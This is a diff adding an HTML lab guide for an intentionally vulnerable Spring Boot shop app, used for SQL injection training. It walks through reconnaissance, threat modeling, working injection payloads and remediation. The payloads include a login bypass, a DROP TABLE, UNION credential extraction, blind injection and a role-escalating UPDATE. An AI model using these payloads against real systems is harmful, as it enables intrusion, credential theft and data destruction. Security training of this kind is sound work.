@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><title>Lab Guide - SQL Injection</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        .step-header{background:#2c3e50;color:#fff;padding:10px 15px;border-radius:5px 5px 0 0}
+        pre{background:#1e1e1e;color:#d4d4d4;padding:12px;border-radius:4px;font-size:.85em;overflow-x:auto}
+        .phase{border-left:4px solid;padding-left:12px;margin-bottom:8px}
+    </style>
+</head>
+<body>
+<nav class="navbar navbar-dark bg-dark py-1">
+    <div class="container-fluid">
+        <span class="navbar-brand fw-bold"><i class="bi bi-book"></i> Lab 01 — SQL Injection Lab Guide</span>
+        <a href="/dashboard" class="btn btn-outline-light btn-sm">← Dashboard</a>
+    </div>
+</nav>
+<div class="container py-4">
+    <div class="alert alert-danger">
+        <strong><i class="bi bi-exclamation-triangle"></i> Educational Lab:</strong>
+        This application contains <strong>intentional SQL injection vulnerabilities</strong>.
+        Use ONLY in isolated training environments. Do NOT deploy to production.
+    </div>
+
+    <!-- Overview -->
+    <div class="card mb-4">
+        <div class="step-header"><h5 class="mb-0">Lab Overview</h5></div>
+        <div class="card-body">
+            <p><strong>Application:</strong> SecureShop Inventory Management (Java Spring Boot)</p>
+            <p><strong>Target URL:</strong> <a href="http://localhost:8080">http://localhost:8080</a></p>
+            <p><strong>Database:</strong> H2 In-Memory (accessible at <a href="/h2-console">/h2-console</a>)</p>
+            <p><strong>Test Credentials:</strong></p>
+            <ul>
+                <li><code>admin / admin123</code> — Admin role</li>
+                <li><code>john / password123</code> — User role</li>
+                <li><code>jane / secret</code> — User role</li>
+                <li><code>manager / manager2024</code> — Manager role</li>
+            </ul>
+            <p><strong>Vulnerabilities:</strong></p>
+            <ul>
+                <li>SQL-001: Authentication bypass (login form)</li>
+                <li>SQL-002: Error-based SQL injection (product search)</li>
+                <li>SQL-003: Blind SQL injection (inventory report date range)</li>
+                <li>SQL-004: UNION-based injection (supplier lookup)</li>
+                <li>SQL-005: Second-order injection (inventory adjust notes)</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Step 1: Recon -->
+    <div class="card mb-4">
+        <div class="step-header"><h5 class="mb-0">Step 1: Reconnaissance & Attack Surface Mapping</h5></div>
+        <div class="card-body">
+            <p>Identify all endpoints that accept user input and interact with the database:</p>
+            <div class="phase border-primary">
+                <strong>Input Points to Map:</strong>
+                <ul class="mt-1 mb-0">
+                    <li><code>POST /auth/login</code> — username, password parameters</li>
+                    <li><code>POST /auth/register</code> — username, email, password</li>
+                    <li><code>POST /auth/reset-password</code> — username, email</li>
+                    <li><code>GET /products/search</code> — q, category parameters</li>
+                    <li><code>GET /inventory/report</code> — startDate, endDate, transactionType</li>
+                    <li><code>GET /suppliers/search</code> — q parameter</li>
+                    <li><code>POST /inventory/adjust</code> — notes parameter (second-order)</li>
+                </ul>
+            </div>
+            <p class="mt-2">Also check exposed attack surface:</p>
+            <ul>
+                <li><a href="/h2-console">/h2-console</a> — Direct DB access</li>
+                <li><a href="/actuator/env">/actuator/env</a> — Environment variables (hardcoded secrets!)</li>
+                <li><a href="/actuator/mappings">/actuator/mappings</a> — All URL mappings</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Step 2: Threat Model -->
+    <div class="card mb-4">
+        <div class="step-header"><h5 class="mb-0">Step 2: Threat Modeling (STRIDE)</h5></div>
+        <div class="card-body">
+            <table class="table table-sm">
+                <thead><tr><th>Threat</th><th>Asset at Risk</th><th>Attack Vector</th><th>CVSS</th></tr></thead>
+                <tbody>
+                    <tr><td><span class="badge bg-danger">Spoofing</span></td><td>Authentication system</td><td>SQL-001: Login bypass</td><td>9.8 Critical</td></tr>
+                    <tr><td><span class="badge bg-danger">Information Disclosure</span></td><td>User credentials, PII</td><td>SQL-002/004: Data exfiltration</td><td>8.6 High</td></tr>
+                    <tr><td><span class="badge bg-warning text-dark">Tampering</span></td><td>Database records</td><td>SQL-005: UPDATE/DELETE via injection</td><td>7.5 High</td></tr>
+                    <tr><td><span class="badge bg-danger">Elevation of Privilege</span></td><td>User roles</td><td>SQL injection → role modification</td><td>8.8 High</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Step 3: Exploitation -->
+    <div class="card mb-4">
+        <div class="step-header"><h5 class="mb-0">Step 3: Vulnerability Discovery & Exploitation</h5></div>
+        <div class="card-body">
+
+            <h6 class="text-danger">SQL-001: Authentication Bypass</h6>
+            <p>Go to <a href="/auth/login">/auth/login</a>. Enter in Username field:</p>
+            <pre>admin' OR '1'='1' --</pre>
+            <p>Any password will work. The generated SQL becomes:<br>
+            <code>SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...'</code></p>
+
+            <hr>
+            <h6 class="text-danger">SQL-002: Error-Based Injection (Product Search)</h6>
+            <p>Go to <a href="/products/search">/products/search</a>. Try in the search box:</p>
+            <pre>' OR 1=1 --</pre>
+            <pre>'; DROP TABLE products --</pre>
+            <p>To extract user data using UNION injection:</p>
+            <pre>' UNION SELECT id,username,password,email,role,quantity,supplier_id,created_at FROM users --</pre>
+
+            <hr>
+            <h6 class="text-danger">SQL-003: Blind SQL Injection (Inventory Report)</h6>
+            <p>Go to <a href="/inventory/report">/inventory/report</a>. Test with time-based blind injection in Start Date:</p>
+            <pre>2020-01-01' AND SLEEP(3) --</pre>
+            <p>If the response takes 3+ seconds → SQL injection confirmed. Boolean-based:</p>
+            <pre>2020-01-01' AND 1=1 --    (returns results = TRUE)
+2020-01-01' AND 1=2 --    (returns no results = FALSE)</pre>
+
+            <hr>
+            <h6 class="text-danger">SQL-004: UNION Injection (Supplier Search)</h6>
+            <p>Go to <a href="/suppliers/search">/suppliers/search</a>:</p>
+            <pre>' UNION SELECT id,username,password,email,role,enabled,last_login FROM users --</pre>
+            <p>This returns user records in the supplier table output, exposing all credentials.</p>
+
+            <hr>
+            <h6 class="text-danger">SQL-005: Second-Order Injection (Inventory Adjust)</h6>
+            <p>Go to <a href="/inventory">Inventory</a>. In the Notes field enter:</p>
+            <pre>test'); UPDATE users SET role='ADMIN' WHERE username='john'; --</pre>
+        </div>
+    </div>
+
+    <!-- Step 4: Impact -->
+    <div class="card mb-4">
+        <div class="step-header"><h5 class="mb-0">Step 4: Impact Assessment</h5></div>
+        <div class="card-body">
+            <ul>
+                <li><strong>Data breach:</strong> All user credentials (plaintext passwords!) exfiltrated</li>
+                <li><strong>Authentication bypass:</strong> Attacker can log in as any user including admin</li>
+                <li><strong>Privilege escalation:</strong> Regular user → Admin via role UPDATE</li>
+                <li><strong>Data destruction:</strong> DROP TABLE possible (depends on DB user permissions)</li>
+                <li><strong>Business impact:</strong> Complete system compromise, regulatory violations (GDPR/PCI-DSS)</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Step 5: Remediation -->
+    <div class="card mb-4">
+        <div class="step-header bg-success"><h5 class="mb-0">Step 5: Remediation — How to Fix</h5></div>
+        <div class="card-body">
+            <h6>1. Use Parameterized Queries (PreparedStatement)</h6>
+            <pre>// VULNERABLE:
+String sql = "SELECT * FROM users WHERE username = '" + username + "'";
+
+// SECURE:
+String sql = "SELECT * FROM users WHERE username = ?";
+PreparedStatement stmt = connection.prepareStatement(sql);
+stmt.setString(1, username);
+
+// Or with JdbcTemplate:
+String sql = "SELECT * FROM users WHERE username = ?";
+jdbcTemplate.queryForList(sql, username);</pre>
+
+            <h6>2. Hash Passwords (BCrypt)</h6>
+            <pre>// Use Spring Security's PasswordEncoder
+BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
+String hashedPassword = encoder.encode(rawPassword);
+// Verify: encoder.matches(rawPassword, storedHash)</pre>
+
+            <h6>3. Apply Least Privilege Database User</h6>
+            <pre>-- Grant only necessary permissions
+GRANT SELECT, INSERT, UPDATE ON inventory_db.products TO 'app_user'@'localhost';
+-- Do NOT grant DROP, CREATE, or access to other tables</pre>
+
+            <h6>4. Validate and Sanitize Input</h6>
+            <pre>// Validate date format before use
+if (!startDate.matches("\\d{4}-\\d{2}-\\d{2}")) {
+    throw new IllegalArgumentException("Invalid date format");
+}</pre>
+        </div>
+    </div>
+
+</div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
